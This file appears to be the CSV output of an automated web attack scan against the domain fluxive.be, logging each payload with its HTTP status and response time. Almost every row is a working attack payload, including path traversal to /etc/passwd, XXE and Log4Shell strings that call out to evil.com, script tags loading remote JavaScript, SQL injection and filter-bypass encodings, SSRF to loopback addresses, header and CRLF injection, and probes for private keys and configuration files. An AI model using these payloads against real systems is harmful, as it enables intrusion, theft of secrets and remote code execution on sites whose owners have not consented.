Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"Local File Inclusion","GET",200,160,"../../../../../../../../etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","GET",200,161,"/etc/passwd",false,false,"Unknown","",""
"HTTP Request Smuggling","GET",200,162,"0

GET / HTTP/1.1
Host: example.com",false,false,"Unknown","",""
"Local File Inclusion","GET",200,186,"/proc/self/environ",false,false,"Unknown","",""
"Local File Inclusion","GET",200,187,"php://filter/convert.base64-encode/resource=index.php",false,false,"Unknown","",""
"HTTP Request Smuggling","GET",200,188,"Transfer-Encoding: chunked
0

GARBAGE",false,false,"Unknown","",""
"LDAP Injection","GET",200,192,"*))(objectClass=*))(|(objectClass=*)",false,false,"Unknown","",""
"NoSQL Injection","GET",200,196,"{""$where"": ""this.password == this.passwordConfirm""}",false,false,"Unknown","",""
"LDAP Injection","GET",200,196,"admin)(|(password=*))",false,false,"Unknown","",""
"Local File Inclusion","GET",200,198,"..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Open Redirect","GET",200,199,"/\evil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,201,"http://evil.com",false,false,"Unknown","",""
"Sensitive Files","GET",200,123,"https://fluxive.be/requirements.txt",false,false,"Unknown","",""
"Sensitive Files","GET",403,129,"https://fluxive.be/.env",false,false,"Unknown","",""
"Sensitive Files","GET",200,130,"https://fluxive.be/.git",false,false,"Unknown","",""
"Sensitive Files","GET",200,140,"https://fluxive.be/package-lock.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,141,"https://fluxive.be/package.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,143,"https://fluxive.be/id_rsa",false,false,"Unknown","",""
"Open Redirect","GET",200,144,"/login?Redirect=../../../..//evil.com",false,false,"Unknown","",""
"Sensitive Files","GET",200,146,"https://fluxive.be/config.php",false,false,"Unknown","",""
"Sensitive Files","GET",200,148,"https://fluxive.be/docker-compose.yml",false,false,"Unknown","",""
"Sensitive Files","GET",403,159,"https://fluxive.be/.git/config",false,false,"Unknown","",""
"Open Redirect","GET",200,170,"/login?Redirect=http://evil.com",false,false,"Unknown","",""
"Sensitive Files","GET",200,170,"https://fluxive.be/composer.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,173,"https://fluxive.be/composer.lock",false,false,"Unknown","",""
"Sensitive Files","GET",200,174,"https://fluxive.be/yarn.lock",false,false,"Unknown","",""
"Sensitive Files","GET",200,178,"https://fluxive.be/id_rsa.pub",false,false,"Unknown","",""
"Open Redirect","GET",200,182,"//google.com%2F%2Fevil.com",false,false,"Unknown","",""
"Sensitive Files","GET",200,180,"https://fluxive.be/web.config",false,false,"Unknown","",""
"Sensitive Files","GET",200,184,"https://fluxive.be/appsettings.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,186,"https://fluxive.be/.gitignore",false,false,"Unknown","",""
"Sensitive Files","GET",200,188,"https://fluxive.be/wp-config.php",false,false,"Unknown","",""
"Sensitive Files","GET",403,125,"https://fluxive.be/.htaccess",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,139,"%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",false,false,"Unknown","",""
"XXE","GET",200,140,"<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",false,false,"Unknown","",""
"Sensitive Files","GET",200,144,"https://fluxive.be/database.yml",false,false,"Unknown","",""
"XXE","GET",200,144,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",false,false,"Unknown","",""
"XXE","GET",200,145,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"CRLF Injection","GET",200,149,"%0d%0aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","GET",200,150,"%0d%0aSet-Cookie: malicious=true",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,152,"\u0027 OR \u00271\u0027=\u00271",false,false,"Unknown","",""
"Sensitive Files","GET",403,157,"https://fluxive.be/.htpasswd",false,false,"Unknown","",""
"XXE","GET",200,167,"<?xml version=""1.0""?><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,170,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",false,false,"Unknown","",""
"XXE","GET",200,171,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"Sensitive Files","GET",200,180,"https://fluxive.be/database.bak",false,false,"Unknown","",""
"CRLF Injection","GET",200,179,"%250d%250aContent-Length:0",false,false,"Unknown","",""
"XXE","GET",200,181,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,187,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,193,"Ω OR Ω=Ω",false,false,"Unknown","",""
"XXE","GET",200,196,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"CRLF Injection","GET",200,197,"
Location: http://malicious.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,131,"X-Forwarded-Proto: https",false,false,"Unknown","",""
"IP Bypass","GET",200,133,"X-Client-IP: 127.0.0.1",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,141,"X-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,141,"X-Forwarded-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,146,"X-HTTP-Method-Override: PURGE",false,false,"Unknown","",""
"IP Bypass","GET",200,151,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,155,"X-Forwarded-For: 127.0.0.1, 2130706433",false,false,"Unknown","",""
"IP Bypass","GET",200,171,"X-Forwarded-For: 127.0.0.1, 0.0.0.0",false,false,"Unknown","",""
"XXE","GET",200,181,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"IP Bypass","GET",200,182,"X-Forwarded-For: 127.0.0.1, evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,185,"Cache-Control: no-cache",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,184,"X-Original-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,186,"X-Forwarded-Scheme: javascript://",false,false,"Unknown","",""
"IP Bypass","GET",200,185,"X-Remote-Addr: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,186,"X-Real-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,188,"X-Forwarded-For: 127.0.0.1, localhost",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,191,"X-Forwarded-Server: evil.com",false,false,"Unknown","",""
"IP Bypass","GET",200,199,"X-Remote-IP: 127.0.0.1",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,201,"X-Forwarded-Port: 443",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,202,"X-Original-URL: /admin",false,false,"Unknown","",""
"User-Agent","GET",ERR,0,"User-Agent:  ",false,false,"Unknown","",""
"User-Agent","GET",200,131,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,139,"\u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a",false,false,"Unknown","",""
"IP Bypass","GET",200,141,"X-Forwarded-For: 127.0.0.1, 0177.0.0.1",false,false,"Unknown","",""
"User-Agent","GET",200,146,"User-Agent: gobuster/3.1.0",false,false,"Unknown","",""
"User-Agent","GET",200,149,"User-Agent: ' OR '1'='1",false,false,"Unknown","",""
"IP Bypass","GET",200,151,"X-Forwarded-For: 127.0.0.1, 127.1",false,false,"Unknown","",""
"User-Agent","GET",200,167,"User-Agent:",false,false,"Unknown","",""
"User-Agent","GET",200,170,"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",false,false,"Unknown","",""
"User-Agent","GET",200,171,"User-Agent: Fuzz Faster U Fool",false,false,"Unknown","",""
"User-Agent","GET",200,172,"User-Agent: *)(uid=*))(|(uid=*)",false,false,"Unknown","",""
"IP Bypass","GET",200,179,"X-Forwarded-For: 127.0.0.1, ::1",false,false,"Unknown","",""
"User-Agent","GET",200,179,"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"User-Agent","GET",200,179,"User-Agent: <script>alert('xss')</script>",false,false,"Unknown","",""
"User-Agent","GET",200,180,"User-Agent: %0d%0aSet-Cookie: injected=true",false,false,"Unknown","",""
"User-Agent","GET",200,182,"User-Agent: Firefox",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,184,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,185,"%252527%252520OR%252520%2527a%252527%253D%252527a",false,false,"Unknown","",""
"User-Agent","GET",200,194,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"User-Agent","GET",200,194,"User-Agent: feroxbuster/2.10.0",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,164,"'%0DOR%0D1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",403,184,"'/**/AND/**/SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,190,"admin'/**/--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,191,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,193,"%2527/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",403,193,"'%2BSLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,195,"CHR(39)||OR||1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,197,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,198,"'%0AOR%0A1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,198,"'CONCAT('a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,200,"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",403,207,"'\u0020AND\u0020SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,231,"'||'a'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,233,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,236,"\u0027\u0020UNION\u0020SELECT\u0020null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,238,"'%A0OR%A01=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,240,"'||(SELECT'a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,243,"\u0027/**/UNION/**/SELECT/**/null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,245,"CHAR(39)+OR+1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,247,"'+(SELECT'a')+'='a",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,127,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,130,"%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,156,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,156,"java script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,162,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,163,"JAVASCRIPT:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,172,"&lt;script&gt;alert(1)&lt;/script&gt;",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,174,"'UNION/*#*/SELECT/*#*/1,2,3--",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,179,"java\script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,179,"<script src=\\evil.com\evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,180,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,181,"&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,186,"<SCRIPT>ALERT(1)</SCRIPT>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,188,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,196,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,241,"<iMg SrC=x OnErRoR=aLeRt(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,242,"<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,241,"<script src=data:text/javascript,alert(1)></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,241,"<script src=//evil.com/evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,242,"<iframe src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,55,"<object data=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,61,"<embed src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,65,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,67,"<svg/onload=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,71,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,73,"<math href=javascript:alert(1)>CLICK",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,77,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,132,"Host: target.com\u000d\u000aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,149,"User-Agent: Mozilla/5.0\r\nX-Injected: true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,152,"X-Custom: test%0d%0aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,153,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,167,"Cookie: $Version=1; admin=""true""; $Path=""/""; $Domain=target.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,168,"X-Custom: test%250d%250aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,169,"X-Custom: test\r\nSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,182,"X-Custom: test%0D%0ALocation: http://evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,183,"Host: target.com%0d%0aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,187,"Cookie: $Version=1; session=""\u0061\u0064\u006d\u0069\u006e""; $Path=""/""",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,191,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,194,"X-Custom: test\u000d\u000aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,198,"Host: target.com\r\nX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,124,"X-Method-Override: PATCH",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,139,"X-Original-URL: %2fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,140,"X-Original-URL: /admin/users",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,140,"X-HTTP-Method-Override: PUT",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,142,"X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,143,"X-Rewrite-URL: /admin\x00",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,148,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,163,"X-Rewrite-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,170,"X-Forwarded-For: 2130706433",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,172,"X-Original-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,179,"X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,182,"User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,182,"X-HTTP-Method: TRACE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,185,"X-Remote-IP: 0177.0.0.1",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,191,"%252e%252e\%252e%252e\%252e%252e\windows\win.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,193,"\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,196,"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,199,"..\u002f..\u002f..\u002fetc\u002fpasswd",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,205,"X-HTTP-Method-Override: DELETE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,207,"X-Original-URL: \u002fadmin",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,141,"%e0%80%ae%e0%80%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,145,"%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,146,"%2e%2e%2f..%2fetc%2fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,151,"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,152,"http://0x7f.0x0.0x0.0x1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,153,"http://[0:0:0:0:0:0:0:1]/",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,161,"..%5c..%5c..%5cwindows%5cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,163,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,187,"http://[::ffff:127.0.0.1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,192,"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,193,"http://%31%32%37%2e%30%2e%30%2e%31/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,192,"ldap://127.0.0.1:389/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,196,"http://0177.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,198,"dict://127.0.0.1:11211/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,199,"gopher://127.0.0.1:80/",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,204,"..\u005c..\u005c..\u005cwindows\u005cwin.ini",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,211,"http://2130706433/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,214,"http://[::1]/",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,216,"..%00/..%00/..%00/etc/passwd%00",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",200,224,"..//..//..//etc//passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,119,"http://127.0.0.1#@evil.com/",false,false,"Unknown","",""
